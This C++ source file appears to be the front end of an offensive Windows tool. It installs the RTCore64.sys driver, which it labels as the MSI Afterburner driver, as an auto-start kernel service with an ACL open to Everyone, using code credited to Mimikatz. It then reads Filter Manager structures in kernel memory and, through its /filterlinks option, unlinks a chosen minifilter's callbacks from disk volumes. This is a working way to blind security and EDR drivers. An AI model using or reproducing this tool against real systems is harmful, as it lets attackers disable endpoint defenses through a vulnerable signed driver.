#include <Windows.h>
#include "memory.h"
#include "FltUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("Usage: %s\n"
			" /filtersshow <filtername> - List Filters or Major Function for a filter\n"
			" /filterlinks <filtername> - Remove Filters related to that driver\n"
			" /installDriver - Install the MSI driver\n"
			" /uninstallDriver - Uninstall the MSI driver\n"
			, argv[0]);
		return 0;
	}

	if (strcmp(argv[1] + 1, "installDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

		if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
			wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
		}
		return 0;
	}
	else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
		service_uninstall(svcName);
		return 0;
	}

	char* strFilterName = (char*) "test";
	char* strDriverName;
	UCHAR indexToRemove = 0;
	DWORD64 AddressToRemove = 0x00;
	if ((!strcmp(argv[1] + 1, "filtersshow") || !strcmp(argv[1] + 1, "filterlinks")) && argv[2] != NULL ) {
		strFilterName = argv[2];
	}
	if ((!strcmp(argv[1] + 1, "filterlinks")) && argc > 3 && argv[3] != NULL) {
		char* inputString = argv[3];
		int inputValue = std::atoi(inputString);
		indexToRemove = static_cast<UCHAR>(inputValue);
	}
	if (!strcmp(argv[1] + 1, "networkfilters") && argv[2] != NULL && !strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
		AddressToRemove = (DWORD64) argv[3];
	}

	Memory m = Memory();
	FltManager oFlt = FltManager(&m);

	if (!strcmp(argv[1] + 1, "filtersshow") || !strcmp(argv[1] + 1, "filterlinks")) {
		wchar_t* wstrFilterName = new wchar_t[strlen(strFilterName) + 2];
		size_t numConv = 0;
		mbstowcs_s(&numConv, wstrFilterName, strlen(strFilterName) + 2, strFilterName, strlen(strFilterName));
		printf("Enumerating for filter %S\n", wstrFilterName);

		DWORD dwX = oFlt.GetFrameCount();
		printf("Flt globals is at %p\n", oFlt.lpFltGlobals);
		printf("%d frames available\n", dwX);
		printf("Frame list is at %p\n", oFlt.lpFltFrameList);

		PVOID lpFilter = oFlt.GetFilterByName(wstrFilterName);
		if (!lpFilter) {
			puts("Target filter not found, exiting...");
			exit(-1);
		}

		PVOID lpFrame = oFlt.GetFrameForFilter(lpFilter);
		if (!lpFrame) {
			puts("Failed to get frame for filter!");
			exit(-1);
		}

		printf("Frame for filter is at %p\n", lpFrame);

		auto vecOperations = oFlt.GetOperationsForFilter(lpFilter);
		for (auto op : vecOperations) {
			const char* strOperation = g_IrpMjMap.count((BYTE)op.MajorFunction) ? g_IrpMjMap[(BYTE)op.MajorFunction] : "IRP_MJ_UNDEFINED";
			printf("MajorFn: %s\nPre: %p\nPost %p\n", strOperation, op.PreOperation, op.PostOperation);
		}

		auto frameVolumes = oFlt.EnumFrameVolumes(lpFrame);
		const wchar_t* strHardDiskPrefix = LR"(\Device\HarddiskVolume)";
		BOOL bRes = false;
		if (strcmp(argv[1] + 1, "filterlinks") == 0) {
			bRes = oFlt.UnLinksForVolumesAndCallbacks(vecOperations, frameVolumes, indexToRemove);
			if (!bRes) {
				puts("Error patching links!");
				exit(-1);
			}
		}
		printf("Press Enter to Restore");
		Sleep(2000);
		getchar();
		BOOL res = oFlt.Restore();
	}

	return 0;
}